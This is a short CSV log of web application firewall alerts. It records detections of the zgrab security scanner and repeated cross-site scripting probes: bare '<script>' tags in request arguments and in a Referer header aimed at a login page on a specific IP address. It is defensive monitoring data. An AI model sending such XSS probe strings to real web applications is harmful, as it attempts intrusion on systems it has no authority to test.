Attack Type,URL Used,Payload Used,Severity
Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
XSS Attack Detected via libinjection,,XSS data found within ARGS_NAMES:<script>: <script>,CRITICAL
XSS Filter - Category 1: Script Tag Vector,,<script> found within ARGS_NAMES:<script>: <script>,CRITICAL
NoScript XSS InjectionChecker: HTML Injection,,<script found within ARGS_NAMES:<script>: <script>,CRITICAL
XSS Attack Detected via libinjection,,XSS data found within ARGS_NAMES:<script>: <script>,CRITICAL
XSS Filter - Category 1: Script Tag Vector,,<script> found within ARGS_NAMES:<script>: <script>,CRITICAL
NoScript XSS InjectionChecker: HTML Injection,,<script found within ARGS_NAMES:<script>: <script>,CRITICAL
XSS Filter - Category 1: Script Tag Vector,"http://35.247.83.47/login.php/?<script>""]",<script> found within REQUEST_HEADERS:Referer: http://35.247.83.47/login.php/?<script>,CRITICAL
NoScript XSS InjectionChecker: HTML Injection,"http://35.247.83.47/login.php/?<script>""]",<script found within REQUEST_HEADERS:Referer: http://35.247.83.47/login.php/?<script>,CRITICAL
XSS Filter - Category 1: Script Tag Vector,"http://35.247.83.47/login.php/?<script>""]",<script> found within REQUEST_HEADERS:Referer: http://35.247.83.47/login.php/?<script>,CRITICAL
NoScript XSS InjectionChecker: HTML Injection,"http://35.247.83.47/login.php/?<script>""]",<script found within REQUEST_HEADERS:Referer: http://35.247.83.47/login.php/?<script>,CRITICAL
XSS Filter - Category 1: Script Tag Vector,"http://35.247.83.47/login.php/?<script>""]",<script> found within REQUEST_HEADERS:Referer: http://35.247.83.47/login.php/?<script>,CRITICAL
NoScript XSS InjectionChecker: HTML Injection,"http://35.247.83.47/login.php/?<script>""]",<script found within REQUEST_HEADERS:Referer: http://35.247.83.47/login.php/?<script>,CRITICAL
